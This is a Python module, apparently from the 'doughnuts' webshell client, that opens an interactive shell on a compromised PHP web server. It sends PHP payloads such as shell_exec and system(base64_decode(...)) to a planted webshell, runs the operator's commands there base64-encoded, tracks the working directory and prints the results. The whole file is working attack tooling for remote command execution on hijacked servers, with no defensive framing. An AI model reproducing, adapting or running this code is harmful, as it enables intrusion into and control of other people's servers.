from libs.config import gget, alias, color, set_namespace
from libs.myapp import send, base64_encode, is_windows
from libs.app import getline


@alias(func_alias="s")
def run():
    """
    shell

    Get a temporary shell of target system by system function.
    """
    print(color.cyan("Eenter interactive temporary shell...\n\nUse 'back' command to return doughnuts.\n"))
    res = send(f'print(shell_exec("whoami")."@".$_SERVER["SERVER_NAME"]."|".getcwd());').r_text.strip()
    prompt, pwd = res.split("|")
    if is_windows():
        prompt = "%s> "
    else:
        prompt = prompt.replace("\r", "").replace("\n", "") + ":%s$ "
    while gget("loop"):
        print(prompt % pwd, end="")
        data = getline()
        lower_data = data.lower()
        if (lower_data.lower() in ['exit', 'quit', 'back']):
            break
        if (data == ''):
            print()
            continue
        data = base64_encode(data)
        if (lower_data.startswith("cd ") and len(lower_data) > 3):
            path = lower_data[3:].strip()
            pwd = send(f'chdir(\'{pwd}\');chdir(\'{path}\');print(getcwd());').r_text.strip()
        else:
            res = send(f'chdir(\'{pwd}\');system(base64_decode(\'{data}\'));')
            print("\n" + res.r_text.strip() + "\n")
    set_namespace("webshell", False)
